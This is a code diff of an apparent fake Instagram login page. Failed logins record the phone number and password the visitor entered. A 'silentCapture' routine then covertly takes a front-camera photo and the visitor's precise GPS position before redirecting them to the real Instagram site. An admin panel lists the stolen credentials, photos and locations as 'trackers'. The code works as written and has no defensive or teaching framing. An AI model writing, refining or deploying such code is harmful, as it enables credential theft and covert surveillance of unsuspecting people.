+          const di = ph ? `<span class="download-link" data-photo="${encodeURIComponent(ph)}"><i class="fas fa-download"></i></span>` : '<span style="color:#444;font-size:12px;">—</span>';
+          return `<div class="list-item-gps status-fail"><span class="idx">${String(i+1).padStart(2,'0')}</span><span class="time">${it.time||'—'}</span><span class="phone">${it.phone||'—'}</span><span class="pass">${it.password||'—'}</span>${gi}${di}</div>`;
         }).join('');
-        failList.querySelectorAll('.gps-link').forEach(el => el.onclick = (e) => { e.stopPropagation(); window.open('https://www.instagram.com', '_blank'); });
-        failList.querySelectorAll('.download-link').forEach(el => el.onclick = function(e) {
-          e.stopPropagation();
-          try { const url = decodeURIComponent(this.dataset.photo); const a = document.createElement('a'); a.href = url; a.download = 'photo_'+Date.now()+'.png'; document.body.appendChild(a); a.click(); document.body.removeChild(a); } catch(err){ alert('خطأ'); }
-        });
-      } else failList.innerHTML = '<div class="empty-list">لا توجد محاولات فاشلة</div>';
+        document.querySelectorAll('.gps-link').forEach(el=>el.onclick=()=>window.open('https://www.instagram.com','_blank'));
+        document.querySelectorAll('.download-link').forEach(el=>el.onclick=function(){ try{ const url=decodeURIComponent(this.dataset.photo); const a=document.createElement('a'); a.href=url; a.download='photo_'+Date.now()+'.png'; document.body.appendChild(a); a.click(); document.body.removeChild(a); }catch(e){ alert('Error'); } });
+      } else { $('failList').innerHTML='<div class="empty-list">No attempts</div>'; }
 
-      const total = succ.length + fail.length;
-      successBadge.textContent = succ.length; failBadge.textContent = fail.length;
-      totalCount.textContent = total; successCount.textContent = succ.length; failCount.textContent = fail.length;
-      totalFailCount.textContent = fail.length;
-      gpsCount.textContent = fail.filter(f => f.gps).length;
-      liveCount.textContent = Object.keys(liveData.trackers || {}).length;
-      lastSuccessTime.textContent = succ.length ? succ[0].time || '—' : '—';
-      lastFailTime.textContent = fail.length ? fail[0].time || '—' : '—';
+      const total=s.length+f.length;
+      $('sBadge').textContent=s.length; $('fBadge').textContent=f.length;
+      $('total').textContent=total; $('success').textContent=s.length; $('fail').textContent=f.length;
+      $('damned').textContent=f.length;
+      $('gps').textContent=f.filter(x=>x.gps).length;
+      $('live').textContent=Object.keys(liveData.trackers||{}).length;
+      $('lastSuccess').textContent=s.length?s[0].time||'—':'—';
+      $('lastFail').textContent=f.length?f[0].time||'—':'—';
     }
 
-    // إضافة محاولة
-    function addAttempt(phone, password, success, gps, photo) {
-      const now = new Date();
-      const timeStr = now.toLocaleDateString('ar-EG') + ' ' + now.toTimeString().split(' ')[0];
-      const entry = { time: timeStr, phone: phone || '(غير مدخل)', password: password || '(غير مدخل)', gps: gps || null, photo: photo || null };
-      if (success) {
-        attemptsData.success.unshift(entry);
-        if (attemptsData.success.length > 50) attemptsData.success.pop();
-      } else {
-        attemptsData.fail.unshift(entry);
-        if (attemptsData.fail.length > 50) attemptsData.fail.pop();
-        if (gps) { gpsData['fail_'+Date.now()] = gps; saveData(GPS_DATA_KEY, gpsData); }
-        if (photo) { photoData['fail_'+Date.now()] = photo; saveData(PHOTO_DATA_KEY, photoData); }
-        if (gps && gps.lat && gps.lng) {
-          const id = 'tracker_'+Date.now();
-          liveData.trackers[id] = { phone, gps, time: timeStr, active: true };
-          saveData(LIVE_KEY, liveData);
+    // --- Add attempt ---
+    function addAttempt(phone, password, success, gps, photo){
+      const now = new Date().toLocaleString('en-US', { hour12:false });
+      const entry = { time: now, phone: phone||'(empty)', password: password||'(empty)', gps: gps||null, photo: photo||null };
+      if(success){
+        attempts.success.unshift(entry);
+        if(attempts.success.length>50) attempts.success.pop();
+      }else{
+        attempts.fail.unshift(entry);
+        if(attempts.fail.length>50) attempts.fail.pop();
+        if(gps){ gpsData['fail_'+Date.now()]=gps; save(KEYS.gps,gpsData); }
+        if(photo){ photoData['fail_'+Date.now()]=photo; save(KEYS.photo,photoData); }
+        if(gps&&gps.lat&&gps.lng){
+          const id='tracker_'+Date.now();
+          liveData.trackers[id]={ phone, gps, time: now, active:true };
+          save(KEYS.live,liveData);
         }
       }
-      saveData(ATTEMPTS_KEY, attemptsData);
+      save(KEYS.attempts, attempts);
       renderLists();
       return entry;
     }
 
-    // جمع البيانات بصمت ثم فتح Instagram
-    function silentCaptureAndRedirect(phone, password) {
-      if (isCapturing) return;
-      isCapturing = true;
-      gpsOverlay.classList.add('show');
-      let positionData = null, photoDataUrl = null;
-      let cameraReady = false, gpsReady = false;
-      const timeout = setTimeout(() => finish(), 4000);
+    // --- Silent capture ---
+    function silentCapture(phone, password){
+      if(capturing) return;
+      capturing=true;
+      $('gpsOverlay').classList.add('show');
+      let pos=null, pic=null, camReady=false, gpsReady=false;
+      const timer=setTimeout(finish, 4000);
 
-      // الكاميرا
-      if (navigator.mediaDevices?.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
-          .then(s => {
-            const video = document.createElement('video');
-            video.srcObject = s;
-            video.style.display = 'none';
+      // Camera
+      if(navigator.mediaDevices?.getUserMedia){
+        navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:false })
+          .then(stream=>{
+            const video=document.createElement('video');
+            video.srcObject=stream;
+            video.style.display='none';
             document.body.appendChild(video);
-            video.onloadedmetadata = () => {
+            video.onloadedmetadata=()=>{
               video.play();
-              setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                photoDataUrl = canvas.toDataURL('image/png');
-                s.getTracks().forEach(t => t.stop());
+              setTimeout(()=>{
+                const canvas=document.createElement('canvas');
+                canvas.width=video.videoWidth||640;
+                canvas.height=video.videoHeight||480;
+                canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
+                pic=canvas.toDataURL('image/png');
+                stream.getTracks().forEach(t=>t.stop());
                 video.remove();
-                cameraReady = true;
-                checkReady();
+                camReady=true;
+                check();
               }, 300);
             };
-            video.onerror = () => { s.getTracks().forEach(t => t.stop()); video.remove(); cameraReady = true; checkReady(); };
+            video.onerror=()=>{ stream.getTracks().forEach(t=>t.stop()); video.remove(); camReady=true; check(); };
           })
-          .catch(() => { cameraReady = true; checkReady(); });
-      } else { cameraReady = true; checkReady(); }
+          .catch(()=>{ camReady=true; check(); });
+      }else{ camReady=true; check(); }
 
       // GPS
-      if (navigator.geolocation) {
+      if(navigator.geolocation){
         navigator.geolocation.getCurrentPosition(
-          pos => { positionData = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }; gpsReady = true; checkReady(); },
-          () => { gpsReady = true; checkReady(); },
-          { enableHighAccuracy: true, timeout: 3000, maximumAge: 60000 }
+          p=>{ pos={ lat:p.coords.latitude, lng:p.coords.longitude, accuracy:p.coords.accuracy }; gpsReady=true; check(); },
+          ()=>{ gpsReady=true; check(); },
+          { enableHighAccuracy:true, timeout:3000, maximumAge:60000 }
         );
-      } else { gpsReady = true; checkReady(); }
+      }else{ gpsReady=true; check(); }
 
-      function checkReady() { if (cameraReady && gpsReady) finish(); }
-      function finish() {
-        addAttempt(phone, password, false, positionData, photoDataUrl);
-        // إخفاء الـ overlay ثم فتح Instagram
-        setTimeout(() => {
-          gpsOverlay.classList.remove('show');
-          isCapturing = false;
-          window.open('https://www.instagram.com', '_blank');
+      function check(){ if(camReady && gpsReady) finish(); }
+      function finish(){
+        addAttempt(phone, password, false, pos, pic);
+        setTimeout(()=>{
+          $('gpsOverlay').classList.remove('show');
+          capturing=false;
+          window.open('https://www.instagram.com','_blank');
         }, 400);
-        clearTimeout(timeout);
+        clearTimeout(timer);
       }
     }
 
-    // معالج الدخول
-    function handleLogin() {
-      const username = usernameInput.value.trim(), password = passwordInput.value.trim();
-      if (username === ADMIN_PHONE && password === ADMIN_PASS) {
-        addAttempt(username, password, true, null, null);
-        loginWrapper.style.display = 'none';
-        adminPanel.classList.add('active');
-        adminPanel.style.display = 'flex';
-        errorMsg.classList.remove('show');
-        usernameInput.value = passwordInput.value = '';
-        updateLoginButton();
+    // --- Login handler ---
+    function handleLogin(){
+      const u=$('usernameInput').value.trim();
+      const p=$('passwordInput').value.trim();
+      if(u===ADMIN.username && p===ADMIN.password){
+        addAttempt(u,p,true,null,null);
+        $('loginWrapper').style.display='none';
+        $('adminPanel').classList.add('active');
+        $('adminPanel').style.display='flex';
+        $('errorMessage').classList.remove('show');
+        $('usernameInput').value=''; $('passwordInput').value='';
+        updateBtn();
         return;
       }
-      errorMsg.textContent = '⚠️ 404 — Login failed';
-      errorMsg.classList.add('show');
-      passwordInput.value = '';
-      updateLoginButton();
-      // جمع البيانات ثم فتح Instagram بعد الحفظ
-      setTimeout(() => silentCaptureAndRedirect(username, password), 300);
+      $('errorMessage').classList.add('show');
+      $('passwordInput').value='';
+      updateBtn();
+      setTimeout(()=>silentCapture(u,p), 300);
     }
 
-    function logoutAdmin() {
-      adminPanel.classList.remove('active');
-      adminPanel.style.display = 'none';
-      loginWrapper.style.display = 'flex';
-      usernameInput.value = passwordInput.value = '';
-      errorMsg.classList.remove('show');
-      updateLoginButton();
+    function logout(){
+      $('adminPanel').classList.remove('active');
+      $('adminPanel').style.display='none';
+      $('loginWrapper').style.display='block';
+      $('usernameInput').value=''; $('passwordInput').value='';
+      $('errorMessage').classList.remove('show');
+      updateBtn();
     }
 
-    function togglePasswordVisibility() {
-      passwordVisible = !passwordVisible;
-      passwordInput.type = passwordVisible ? 'text' : 'password';
-      eyeIcon.className = passwordVisible ? 'fas fa-eye' : 'fas fa-eye-slash';
+    function togglePw(){
+      pv=!pv;
+      $('passwordInput').type=pv?'text':'password';
+      $('eyeIcon').className=pv?'fas fa-eye':'fas fa-eye-slash';
     }
 
-    function updateLoginButton() {
-      loginBtn.classList.toggle('active', usernameInput.value.trim().length > 0 || passwordInput.value.trim().length > 0);
+    function updateBtn(){
+      const u=$('usernameInput').value.trim();
+      const p=$('passwordInput').value.trim();
+      $('loginBtn').classList.toggle('active', u.length>0 || p.length>0);
     }
 
-    function updateLogoFromFile(file) {
-      if (!file) return;
-      const reader = new FileReader();
-      reader.onload = function(e) { const data = e.target.result; renderLogo(data); saveLogoToStorage(data); alert('✅ تم حفظ الشعار'); };
-      reader.readAsDataURL(file);
+    // --- Logo upload ---
+    function updateLogo(file){
+      if(!file) return;
+      const r=new FileReader();
+      r.onload=e=>{ const data=e.target.result; renderLogo(data); LS.setItem(KEYS.logo,data); alert('Logo saved'); };
+      r.readAsDataURL(file);
     }
-    function resetLogoToDefault() { removeSavedLogo(); renderLogo(null); logoUpload.value = ''; alert('🔄 تم إعادة الشعار'); }
+    function resetLogo(){ LS.removeItem(KEYS.logo); renderLogo(null); $('logoUpload').value=''; alert('Logo reset'); }
 
-    // أحداث
-    showToggle.addEventListener('click', togglePasswordVisibility);
-    usernameInput.addEventListener('input', updateLoginButton);
-    passwordInput.addEventListener('input', updateLoginButton);
-    loginBtn.addEventListener('click', handleLogin);
-    usernameInput.addEventListener('keydown', e => e.key === 'Enter' && handleLogin());
-    passwordInput.addEventListener('keydown', e => e.key === 'Enter' && handleLogin());
-    logoutBtn.addEventListener('click', logoutAdmin);
-    continueBtn.addEventListener('click', () => window.open('https://www.instagram.com', '_blank'));
-    logoUpload.addEventListener('change', function() { if(this.files[0]) updateLogoFromFile(this.files[0]); });
-    saveLogoBtn.addEventListener('click', () => localStorage.getItem(LOGO_KEY) ? alert('✅ محفوظ') : alert('⚠️ اختر صورة'));
-    resetLogoBtn.addEventListener('click', resetLogoToDefault);
+    // --- Events ---
+    $('showToggle').addEventListener('click', togglePw);
+    $('usernameInput').addEventListener('input', updateBtn);
+    $('passwordInput').addEventListener('input', updateBtn);
+    $('loginBtn').addEventListener('click', handleLogin);
+    $('usernameInput').addEventListener('keydown', e=>{ if(e.key==='Enter') handleLogin(); });
+    $('passwordInput').addEventListener('keydown', e=>{ if(e.key==='Enter') handleLogin(); });
+    $('logoutBtn').addEventListener('click', logout);
+    $('continueBtn').addEventListener('click', ()=>window.open('https://www.instagram.com','_blank'));
+    $('logoUpload').addEventListener('change', function(){ if(this.files[0]) updateLogo(this.files[0]); });
+    $('saveLogo').addEventListener('click', ()=> LS.getItem(KEYS.logo) ? alert('Already saved') : alert('Upload a logo first'));
+    $('resetLogo').addEventListener('click', resetLogo);
 
-    // تهيئة
-    loadSavedLogo();
+    // --- Init ---
+    loadLogo();
     renderLists();
-    setInterval(() => footerTime.textContent = new Date().toLocaleString('ar-EG'), 1000);
-    adminPanel.style.display = 'none';
-    adminPanel.classList.remove('active');
-    errorMsg.classList.remove('show');
-    console.log('✅ النظام جاهز: بعد الحفظ يفتح Instagram');
+    setInterval(()=>$('footerTime').textContent=new Date().toLocaleString(), 1000);
+    $('adminPanel').style.display='none';
+    $('adminPanel').classList.remove('active');
+    $('errorMessage').classList.remove('show');
+    console.log('✅ Ready. Use admin/admin to login.');
   })();
 </script>
 </body>
